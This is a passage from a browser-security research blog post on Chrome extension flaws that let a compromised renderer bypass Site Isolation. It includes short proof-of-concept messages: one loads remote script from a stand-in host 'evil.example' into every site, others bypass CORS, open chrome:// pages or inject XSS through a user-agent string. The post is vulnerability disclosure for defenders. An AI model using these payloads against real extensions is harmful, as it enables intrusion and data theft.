Extension Store, etc, which aren‚Äôt usually allowed to be scripted by extensions. This extension has 100k+ users at the time of writing.</p><h3 id="uxss">UXSS</h3><p>I started reviewing the extension‚Äôs code, and soon I noticed the following message listener in the Background script.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
var target = msg['target'];
var action = msg['action'];
switch (target) {
...
  case 'Prefs':
      if (action == 'getPrefs') {
          this.prefs.sendPrefsToPort(port);
      } else if (action == 'setPref') {
          var pref = (msg['pref']);
          var announce = !!msg['announce'];
          <span style="color:DodgerBlue">cvox.ChromeVoxBackground.setPref(pref, msg['value'], announce);</span>
      }
      break;
</pre></table></code></div></div><p>Where <em>msg</em> is the message object received from a content script. This code snippet essentially allows a content script to get or set preferences. So, I looked for a preference which might allow us to exploit this bug. And luckily, there was a preference called <em>siteSpecificScriptLoader</em>. If this preference is set to a URL, the extension would fetch the URL content and inject that as a content script to all websites üòä</p><p>With a compromised renderer, sending following message would result in a UXSS which also runs script in some privileged pages as well üòä</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cvox.ChromeVox.host.sendToBackgroundPage({'target': 'Prefs', 'action': 'setPref',
'pref': 'siteSpecificScriptLoader', 'value': 'https://evil.example/bad.js', 'announce': true});
</pre></table></code></div></div><h3 id="cors-bypass">CORS bypass</h3><p>I noticed another interesting message listener.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>cvox.InjectedScriptLoader.fetchCode = function(files, done) {
    var code = {};
    var waiting = files.length;
    var loadScriptAsCode = function(src) {
        var xhr = new XMLHttpRequest();
        <span style="color:DodgerBlue">var url = chrome.extension.getURL(src) + '?' + new Date().getTime();</span>
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                var scriptText = xhr.responseText;
                ...
                code[src] = scriptText;
                waiting--;
                if (waiting == 0) {
                    done(code);
                }
            }
        };
        <span style="color:DodgerBlue">xhr.open('GET', url);</span>
        xhr.send(null);
    };
    files.forEach(function(f) {
        loadScriptAsCode(f);
    });
};

...

chrome.extension.onMessage.addListener(function(request, sender, callback) {
    if (request['srcFile']) {
        var srcFile = request['srcFile'];
        <span style="color:DodgerBlue">cvox.InjectedScriptLoader.fetchCode</span>([srcFile], function(code) {
            callback({
                'code': code[srcFile]
            });
        });
    }
    return true;
});
</pre></table></code></div></div><p>This code gets <em>srcFile</em> which is a URL, and they convert this URL to a full URL using <code class="language-plaintext highlighter-rouge">chrome.extension.getURL</code>, and then use XHR to fetch the file and return content to the Content script.</p><p>All seems good so far, but there is a problem due to a weird bug in <code class="language-plaintext highlighter-rouge">chrome.extension.getURL</code>. Previously, if you provide a full URL to <code class="language-plaintext highlighter-rouge">chrome.extension.getURL</code>, it would return the URL as it is, which is different from <code class="language-plaintext highlighter-rouge">chrome.runtime.getURL</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>&gt; chrome.runtime.getURL(‚Äúhttps://test.example‚Äù);
"chrome-extension://foo/https://test.example"
&gt; chrome.extension.getURL(‚Äúhttps://test.example‚Äù);
"https://test.example"
</pre></table></code></div></div><p>By abusing this behavior, we can fetch any websites‚Äô content using above listener because Background script can bypass CORS.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>chrome.extension.sendMessage({srcFile: 'https://www.google.com'}, content =&gt; {alert(content)});
</pre></table></code></div></div><h3 id="local-file-disclosure">Local file disclosure</h3><p>Investigating further, I found yet another suspicious message listener üòä</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>var target = msg['target'];
var action = msg['action'];
switch (target) {
...
  case 'OpenTab':
      var destination = {
              url: msg['url']
      };
      <span style="color:DodgerBlue">chrome.tabs.create(destination);</span>
      break;
</pre></table></code></div></div><p>This is the same listener which had the UXSS bug. But in this case, it gets a URL from message object and passes that directly to <code class="language-plaintext highlighter-rouge">chrome.tabs.create</code>. Well, what could go wrong? Because <code class="language-plaintext highlighter-rouge">chrome.tabs.create</code> is an extension API, it can open URLs which aren‚Äôt possible to open from a website, such as File URLs and Chrome URLs (used for browser internal pages).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cvox.ChromeVox.host.sendToBackgroundPage({'target': 'OpenTab', 'url': 'chrome://settings'});
</pre></table></code></div></div><p>This could lead to a local file disclosure using the same technique as the <a href="#site-isolation-bypass-and-local-file-disclosure-via-payment-handler-api">Sergei‚Äôs bug</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/Vox.PNG" /></p><h3 id="browsing-history-leaks">Browsing history leaks</h3><p>The Screen Reader extension always leaks 20 most recent visited URLs to all Content Scripts.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cvox.ChromeVox.visitedUrls;
</pre></table></code></div></div><p>This doesn‚Äôt require a compromised renderer because a Spectre exploit should be able to read the renderer process‚Äô memory.</p><h3 id="demo">Demo</h3><p>Here is a demo showing all the bugs in action.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/lfSLAhEvm6Y" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p>All of the bugs are <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=982326">fixed</a> (along with the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=984696"><code class="language-plaintext highlighter-rouge">chrome.extension.getURL</code> bug</a>) except for the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1016535">browsing history leak bug</a>, which the Chrome team has decided not to fix. Users of the Screen Reader extension should be aware that any site may read your 20 most recently visited URLs with a Spectre exploit.</p><h2 id="user-agent-switcher-for-chrome">User-Agent Switcher for Chrome</h2><p>The <a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg">User-Agent Switcher for Chrome</a> is an extension which allows users to change user agent when visiting a website. This extension has 2M+ users at the time of writing.</p><p>Soon after looking at the extension‚Äôs code, I found an interesting message listener.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>chrome.extension.onRequest.addListener(
    function(request, sender, sendResponse) {
        ...
        else if (request.action == "add_ua") {
            addCustomUAOption(request.name, request.user_agent, request.append_to_default_ua, request.indicator);
        ...
        }
</pre></table></code></div></div><p>This basically allows the message sender to add a new user agent string. So, what can we do with it? This extension also tried to spoof user agent in the page‚Äôs JavaScript as well (i.e. <code class="language-plaintext highlighter-rouge">navigator.userAgent</code>). The following Content script was injected to every sites.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>var a = document.createElement("script");
a.type = "text/javascript";
a.innerText += "Object.defineProperty(window.navigator, 'userAgent',
{ get: function(){ return '" + (b.append_to_default_ua ? navigator.userAgent + ' ' + <span style="color:DodgerBlue">b.ua_string : b.ua_string</span>) + "'; } });";
...
document.documentElement.insertBefore(a, document.documentElement.firstChild);
</pre></table></code></div></div><p>This content script has an XSS, assuming user agent string can be controlled. And because a compromised renderer process can send a message to add an arbitrary user agent string, this leads to a UXSS bug.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>chrome.extension.sendRequest({action: 'add_ua', name: 'Edge', user_agent: "Edge'+alert(origin)+'",
append_to_default_ua: true, indicator: 'Edge'});
</pre></table></code></div></div><p>I have reported this issue to Google and this has been fixed.</p><h2 id="other-extensions">Other extensions</h2><p>I have found multiple bugs in extensions developed by Google, so I thought I will look at other commonly used extensions. And surely enough, I have found many bugs in other extensions too. I‚Äôm not going to explain technical details for those, but following summarizes what I have found (all of which have been fixed).</p><ol><li>Steal all usernames and passwords from <a href="https://chrome.google.com/webstore/detail/lastpass-free-password-ma/hdokiejnpimakedhajhdlcegeplioahd">LastPass</a> extension with a compromised renderer (10M+ users).</li><li>Steal all usernames, passwords, and credit card information from <a href="https://chrome.google.com/webstore/detail/dashlane-password-manager/fdjamakpfbbddfjaooikfcpapjohcfmg">Dashlane</a> extension with a compromised renderer (4M+ users).</li><li><a href="https://github.com/uBlockOrigin/uBlock-issues/issues/710#issuecomment-526935711">UXSS, CORS bypass, and local file disclosure</a> in <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">uBlock Origin</a> extension with a compromised renderer (10M+ users).</li><li>Steal all credit card information from <a href="https://chrome.google.com/webstore/detail/keeper%C2%AE-password-manager/bfogiafebfohielmmehodmfbbebbbpei">Keeper Security</a> extension with a compromised renderer (300k+ users).</li></ol><p>This shows that trusting messages from Content script is quite common in extensions.</p><h1 id="conclusion">Conclusion</h1><p>It‚Äôs really exciting to see how much Site Isolation was able to reduce the damages a renderer exploit could make. However, once extensions are installed, these seems to be a higher chance that a renderer exploit can still bypass Site Isolation through extensions. Therefore, extension developers should be mindful of those attack surface and always verify the message sender‚Äôs origin or URL. And users should only install extensions which they really trust.</p><p>If you enjoy doing this stuff, we are hiring üòä</p><ol><li><a href="https://careers.microsoft.com/us/en/job/933244/">Software Security Engineer</a></li><li><a href="https://careers.microsoft.com/us/en/job/936711/">Senior Security Software Engineer</a></li></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/edgevr/categories/vulnerabilities/'>Vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/edgevr/tags/site-isolation/" class="post-tag no-text-decoration" >Site Isolation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Deep Dive into Site Isolation (Part 2) - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Deep Dive into Site Isolation (Part 2) - Microsoft Browser Vulnerability Research&u=https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Deep Dive into Site Isolation (Part 2) - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/edgevr/posts/Introducing-Enhanced-Security-for-Microsoft-Edge/">Introducing Enhanced Security for Microsoft Edge</a></li><li><a href="/edgevr/posts/Super-Duper-Secure-Mode/">Super Duper Secure Mode</a></li><li><a href="/edgevr/posts/attacking-the-devtools/">Guest Blog Post - Attacking the DevTools</a></li><li><a href="/edgevr/posts/eliminating-xss-with-trusted-types/">Eliminating XSS from WebUI with Trusted Types</a></li><li><a href="/edgevr/posts/Hacking-Chrome-iOS/">iOS Chromium Overlooked and Underappreciated</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/edgevr/posts/deep-dive-into-site-isolation-part-1/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 10, 2020 <i class="unloaded">2020-11-10T10:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Deep Dive into Site Isolation (Part 1)</h3><div class="text-muted small"><p> Back in 2018, Chrome enabled Site Isolation by default, which mitigates attacks such as UXSS and Spectre. At the time, I was actively participating in the Chrome Vulnerability Reward Program, and I...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/yet-another-uaf/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 2, 2021 <i class="unloaded">2021-03-02T08:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Yet another RenderFrameHostImpl UAF</h3><div class="text-muted small"><p> Introduction Back in 2020 while reviewing Chromium code, I found issue 1068395, a Use-After-Free in Browser Process that can be used to escape the Chromium sandbox on Android Devices. This is an i...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/eliminating-xss-with-trusted-types/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 26, 2021 <i class="unloaded">2021-03-26T09:30:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Eliminating XSS from WebUI with Trusted Types</h3><div class="text-muted small"><p> After the research on Site Isolation, it became clear that the most common problem with extensions is calling chrome.tabs.create with a URL received from a content script message. While such a bug ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/edgevr/posts/deep-dive-into-site-isolation-part-1/" class="btn btn-outline-primary"><p>Deep Dive into Site Isolation (Part 1)</p></a> <a href="/edgevr/posts/yet-another-uaf/" class="btn btn-outline-primary"><p>Yet another RenderFrameHostImpl UAF</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/MSEdgeDev">Microsoft Corporation</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/edgevr/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://microsoftedge.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
